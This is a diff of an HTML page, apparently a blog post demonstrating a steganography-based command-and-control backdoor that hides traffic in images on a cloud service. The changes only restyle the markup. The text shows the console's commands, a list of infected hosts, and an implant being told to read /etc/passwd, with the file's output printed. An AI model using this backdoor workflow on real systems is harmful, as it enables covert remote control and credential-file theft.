@@ -135,7 +135,7 @@
 
 <p>The C&amp;C server offers an ‘interactive’ shell which offers few commands that are:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>C&amp;C console &gt; help
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C&amp;C console &gt; help
 
 
  cleanup - Clean Cloud Service images
@@ -152,36 +152,33 @@
 
 
 C&amp;C console &gt; 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Once you’ve deployed the backdoor on a couple of systems, you can check available clients using the bots command:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>C&amp;C console &gt; bots
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C&amp;C console &gt; bots
 Bot: 04:D6:27:72:A3:E9 Windows-7-6.1.7601-SP1
 Bot: 68:A3:C4:F0:98:CE Linux-4.4.0-23-generic-x86_64-with-Ubuntu-16.04-xenial
 Bot: 04:00:72:3F:D6:98 Linux-3.16.0-4-amd64-x86_64-with-debian-8.2
 C&amp;C console &gt; 
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>The output is the MAC address which is used to uniquely identifies the system but also gives you OS information the implant is running on.</p>
 
 <p>Let’s issue a command to an implant:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>C&amp;C console &gt; cmd 04:00:72:3F:D6:98 cat /etc/passwd  
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C&amp;C console &gt; cmd 04:00:72:3F:D6:98 cat /etc/passwd  
 [+] Downloading image from Cloud Service...
 [+] Uploaded image to Cloud Service
 [+] Steganography applied, image saved
 [+] Sent command cat /etc/passwd with jobid: 631f4ee7328244b8b462876e1f8dd753
 C&amp;C console &gt; 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Lets get the results!</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>C&amp;C console &gt; retrieve 631f4ee7328244b8b462876e1f8dd753
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C&amp;C console &gt; retrieve 631f4ee7328244b8b462876e1f8dd753
 631f4ee7328244b8b462876e1f8dd753: 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -218,18 +215,16 @@ haproxy:x:113:121::/var/lib/haproxy:/bin/false
 proftpd:x:114:65534::/run/proftpd:/bin/false
 ftp:x:115:65534::/srv/ftp:/bin/false
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Retrieve previous commands</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>C&amp;C console &gt; commands
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C&amp;C console &gt; commands
 631f4ee7328244b8b462876e1f8dd753: 'cat /etc/passwd' on 04:00:72:3F:D6:98
 97ee81e0647a4f248ac47c68e8b25b88: 'ipconfig' on 04:D6:27:72:A3:E9
 C&amp;C console &gt; 
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="cast">Cast</h3>
 <p><a href="https://asciinema.org/a/4oo26ixuqfzyknztyamw8qgdw?autoplay=1"><img src="https://asciinema.org/a/4oo26ixuqfzyknztyamw8qgdw.png" alt="cast" /></a></p>
